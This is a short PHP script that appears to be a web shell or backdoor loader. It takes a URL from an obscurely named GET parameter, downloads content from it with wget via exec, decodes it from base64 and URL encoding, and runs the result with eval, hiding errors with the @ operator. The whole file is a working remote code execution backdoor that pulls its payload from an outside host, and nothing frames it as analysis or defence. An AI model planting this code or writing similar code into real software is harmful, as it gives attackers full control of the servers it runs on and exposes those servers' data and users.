<?php

$j = 'https://'.@$_GET['1g2e3fathpu0rm'];
@exec("wget $j -qO-", $y);
$p = base64_decode($y[0]);
$a = urldecode($p);
$r = '?>';
$c = $r.$a;
eval($c);
